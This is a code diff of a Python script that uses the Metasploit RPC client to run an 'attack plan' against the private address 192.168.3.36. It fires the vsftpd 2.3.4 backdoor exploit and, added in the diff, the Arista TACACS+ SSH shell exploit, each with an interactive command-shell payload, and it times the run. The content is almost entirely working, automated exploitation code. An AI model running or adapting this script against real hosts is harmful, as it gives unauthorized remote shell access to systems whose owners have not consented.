@@ -13,13 +13,20 @@ client = MsfRpcClient('123456', ssl=True)
 start = time.time()
 
 print("======ASAP Attack Plan Start======")
-
 exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
+print("======Exploit Description======")
 print(exploit.description)
 print("======Exploit Started======")
 exploit['RHOSTS'] = '192.168.3.36'
 
 print("Shell Obtained:",exploit.execute(payload='cmd/unix/interact'))
+print("======Exploit Description======")
+#print(client.modules.exploits)
+exploit2 = client.modules.use('exploit','unix/ssh/arista_tacplus_shell')
+print(exploit2.description)
+print("======Exploit Started======")
+print("Shell Obtained:",exploit2.execute(payload='cmd/unix/interact'))
+#print("Shell Obtained:",exploit.execute(payload=''))
 end =time.time()
 print("Time for Attack Plan Execution:", end-start)
 
